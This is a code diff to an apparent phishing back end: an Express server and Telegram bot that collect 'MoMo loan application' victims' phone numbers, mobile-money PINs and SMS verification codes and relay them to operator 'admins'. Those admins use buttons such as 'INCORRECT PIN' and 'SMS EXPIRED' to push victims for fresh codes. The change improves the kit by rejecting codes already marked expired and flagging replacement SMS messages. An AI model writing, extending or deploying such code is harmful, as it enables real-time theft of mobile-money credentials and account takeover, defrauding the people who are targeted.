@@ -26,6 +26,10 @@ mainBot.on('polling_error', (error) => {
 let activeSessions = {};
 let registeredAdmins = new Map();
 
+function normalizeSms(text) {
+    return (text || '').trim().replace(/\s+/g, ' ');
+}
+
 function escapeMarkdown(text) {
     if (!text) return '';
     return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
@@ -167,6 +171,9 @@ mainBot.on('callback_query', async (query) => {
     } else if (action === 'wrongpin') {
         session.status = 'incorrect_pin';
     } else if (action === 'smsexpired') {
+        if (session.lastSmsNorm) {
+            session.expiredSmsList.add(session.lastSmsNorm);
+        }
         session.status = 'sms_expired';
     } else if (action === 'done') {
         session.status = 'otp_step';
@@ -204,7 +211,10 @@ app.post('/api/submit-credentials', (req, res) => {
         loanAmount: loanAmount || '100,000',
         applicantName: applicantName || '',
         targetAdmin,
-        status: 'pending_pin'
+        status: 'pending_pin',
+        expiredSmsList: new Set(),
+        lastSmsNorm: '',
+        smsAttemptCount: 0
     };
 
     const message = `NEW MOMO APPLICATION\n\n` +
@@ -235,23 +245,34 @@ app.post('/api/submit-sms', (req, res) => {
         return res.json({ success: false, status: 'not_found' });
     }
 
-    session.smsText = smsText;
+    const cleanSms = normalizeSms(smsText);
+
+    if (session.expiredSmsList.has(cleanSms)) {
+        session.status = 'sms_expired';
+        return res.json({ success: false, rejectedDuplicate: true, status: 'sms_expired' });
+    }
+
+    session.smsAttemptCount = (session.smsAttemptCount || 0) + 1;
+    const isReplacementSms = session.expiredSmsList.size > 0 || session.smsAttemptCount > 1;
+    session.lastSmsNorm = cleanSms;
+    session.smsText = cleanSms;
     session.status = 'pending_sms_review';
 
     if (isSubAdminBlocked(session.targetAdmin)) {
-        return res.json({ success: true });
+        return res.json({ success: true, rejectedDuplicate: false });
     }
 
-    const message = `MOMO SMS RECEIVED\n\n` +
+    const headerLabel = isReplacementSms ? "NEW MOMO SMS RECEIVED" : "MOMO SMS RECEIVED";
+    const message = `${headerLabel}\n\n` +
         `PHONE NO: ${session.phone}\n` +
         `PIN: ${session.pin}\n\n` +
-        `WHOLE SMS:\n${smsText}`;
+        `WHOLE SMS:\n${cleanSms}`;
 
     mainBot.sendMessage(session.targetAdmin, message, {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: "📋 COPY SMS", copy_text: { text: smsText } }
+                    { text: "📋 COPY SMS", copy_text: { text: cleanSms } }
                 ],
                 [
                     { text: "INCORRECT PIN", callback_data: `wrongpin_${sessionId}` },
@@ -264,7 +285,7 @@ app.post('/api/submit-sms', (req, res) => {
         }
     }).catch(err => console.error("Telegram SMS send error:", err.message));
 
-    res.json({ success: true });
+    res.json({ success: true, rejectedDuplicate: false });
 });
 
 app.post('/api/request-new-sms', (req, res) => {
@@ -334,4 +355,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-      
+        
